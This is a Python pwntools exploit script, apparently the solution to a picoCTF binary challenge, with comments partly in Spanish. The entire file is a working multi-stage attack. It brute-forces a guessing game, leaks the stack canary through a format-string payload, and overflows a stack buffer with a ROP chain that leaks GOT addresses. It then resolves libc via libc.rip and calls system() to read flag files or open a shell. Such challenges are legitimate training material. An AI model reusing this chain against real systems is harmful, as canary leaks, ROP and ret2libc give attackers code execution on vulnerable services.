#!/usr/bin/env python3
from __future__ import annotations

import argparse
import re
import sys
from dataclasses import dataclass

import requests
from pwn import ELF, PIPE, ROP, context, p32, process, remote, u32


context.clear(arch="i386", os="linux")
context.log_level = "error"


PROMPT_GUESS = b"What number would you like to guess?\n"
PROMPT_NAME = b"Name? "


@dataclass(frozen=True)
class LibcOffsets:
    puts: int
    printf: int
    system: int
    str_bin_sh: int
    exit: int | None = None


def guess_until_win(io) -> None:
    # For typical 32-bit libc addresses (0xf7xxxxxx, negative as signed),
    # the signed-mod math yields a value in [-4094, 1], but to be safe we cover [-4096, 4096].
    for n in range(-4096, 4097):
        io.recvuntil(PROMPT_GUESS)
        io.sendline(str(n).encode())
        out = io.recvuntil(b"\n\n")
        if b"Congrats! You win!" in out:
            io.recvuntil(PROMPT_NAME)
            return
    raise RuntimeError("No se encontró número ganador en el rango de brute force.")


def leak_canary(io) -> int:
    # Leakeamos muchos dwords del stack con `%x.` (sin parámetros posicionales).
    # En este binario, el canary aparece como el 135º valor (1-based).
    n = 140
    io.sendline((b"%x." * n))
    out = io.recvuntil(b"\n\n")
    line = out.split(b"Congrats: ", 1)[1].split(b"\n", 1)[0].strip()
    vals = [int(x, 16) for x in line.split(b".") if x]
    if len(vals) < 137:
        raise RuntimeError("Leak de stack insuficiente para recuperar canary.")
    canary = vals[134]
    if (canary & 0xFF) != 0:
        raise RuntimeError(f"Canary inesperado: {hex(canary)}")
    return canary


def recv_ptr_from_puts_got_dump(io) -> int:
    # `puts(got_entry)` prints bytes from the GOT entry onward until a NUL byte,
    # then appends a newline. We read the first 4 raw bytes as the pointer,
    # then drain until the newline to realign the stream.
    raw4 = io.recvn(4, timeout=5)
    io.recvuntil(b"\n", timeout=5)
    return u32(raw4)


def libc_rip_find(puts_addr: int, printf_addr: int) -> LibcOffsets:
    # libc.rip now expects POST JSON.
    body = {"symbols": {"puts": hex(puts_addr), "printf": hex(printf_addr)}}
    r = requests.post("https://libc.rip/api/find", json=body, timeout=20)
    r.raise_for_status()
    matches = r.json()
    if not matches:
        raise RuntimeError("libc.rip no devolvió coincidencias.")
    # Pick the first match (usually unique once 2 symbols are provided)
    m0 = matches[0]
    syms = m0.get("symbols", {})
    # Some libc entries omit exit; that's fine.
    return LibcOffsets(
        puts=int(syms["puts"], 16),
        printf=int(syms["printf"], 16),
        system=int(syms["system"], 16),
        str_bin_sh=int(syms["str_bin_sh"], 16),
        exit=int(syms["exit"], 16) if "exit" in syms else None,
    )


def build_overflow_payload(canary: int, rop_chain: bytes) -> bytes:
    # win() stack layout (from disasm):
    # - buffer: [ebp-0x20c] (512 bytes)
    # - canary: [ebp-0xc]
    # - padding: [ebp-0x8]
    # - saved ebx: [ebp-0x4]  (we set it to GOT base 0x8049fbc)
    # - saved ebp
    buf = b"A" * 512
    pad_after_canary = b"B" * 4
    saved_ebx = p32(0x8049FBC)  # _GLOBAL_OFFSET_TABLE_
    saved_ebp = b"C" * 4
    return buf + p32(canary) + pad_after_canary + saved_ebx + saved_ebp + rop_chain


def main() -> int:
    ap = argparse.ArgumentParser()
    ap.add_argument("--host", default=None)
    ap.add_argument("--port", type=int, default=None)
    ap.add_argument("--local", action="store_true")
    ap.add_argument("--binary", default="./vuln")
    args = ap.parse_args()

    elf = ELF(args.binary)
    rop = ROP(elf)

    puts_plt = elf.plt["puts"]
    puts_got = elf.got["puts"]
    printf_got = elf.got["printf"]
    win = elf.symbols["win"]
    main_addr = elf.symbols["main"]
    pop_ebx_ret = rop.find_gadget(["pop ebx", "ret"]).address

    if args.local:
        # Use pipes (not PTY) so NUL bytes (canary) are transmitted correctly.
        io = process(args.binary, stdin=PIPE, stdout=PIPE)
    else:
        if not args.host or not args.port:
            print("Falta --host/--port (o usa --local).", file=sys.stderr)
            return 2
        io = remote(args.host, args.port)

    # Stage 1: win once, leak canary via format string
    guess_until_win(io)
    canary = leak_canary(io)

    # Stage 2: win again, overflow -> leak puts+printf from GOT, return to win
    guess_until_win(io)

    rop_leak = b"".join(
        [
            p32(puts_plt),
            p32(pop_ebx_ret),
            p32(puts_got),
            p32(puts_plt),
            p32(pop_ebx_ret),
            p32(printf_got),
            p32(win),
            p32(main_addr),
        ]
    )
    payload2 = build_overflow_payload(canary, rop_leak)
    io.sendline(payload2)

    # Consume "Congrats: " line (prints a bunch of 'A's then newline)
    io.recvuntil(b"Congrats: ")
    # After printing our string, win() prints "\n\n" via puts().
    io.recvuntil(b"\n\n")

    puts_addr = recv_ptr_from_puts_got_dump(io)
    printf_addr = recv_ptr_from_puts_got_dump(io)

    offs = libc_rip_find(puts_addr, printf_addr)
    libc_base = puts_addr - offs.puts
    system_addr = libc_base + offs.system
    binsh_addr = libc_base + offs.str_bin_sh
    exit_addr = (libc_base + offs.exit) if offs.exit is not None else 0

    # Now we should be back in win() prompt without guessing.
    io.recvuntil(PROMPT_NAME)

    # Stage 3: avoid interactive shell; call gets(.bss) then system(.bss)
    cmd_addr = elf.bss(0x800)
    gets_plt = elf.plt["gets"]
    rop_cmd = b"".join(
        [
            p32(gets_plt),
            p32(pop_ebx_ret),
            p32(cmd_addr),
            p32(system_addr),
            p32(exit_addr),
            p32(cmd_addr),
        ]
    )
    payload3 = build_overflow_payload(canary, rop_cmd)
    io.sendline(payload3)

    # Try to read flag automatically.
    io.sendline(
        b"cat flag.txt 2>/dev/null; cat /challenge/flag.txt 2>/dev/null; cat /home/*/flag.txt 2>/dev/null; echo DONE"
    )
    data = io.recvuntil(b"DONE", timeout=8)
    m = re.search(rb"picoCTF\{[^\}]+\}", data)
    if m:
        sys.stdout.buffer.write(m.group(0) + b"\n")
        return 0

    # Fallback to interactive if needed.
    io.interactive()
    return 0


if __name__ == "__main__":
    raise SystemExit(main())

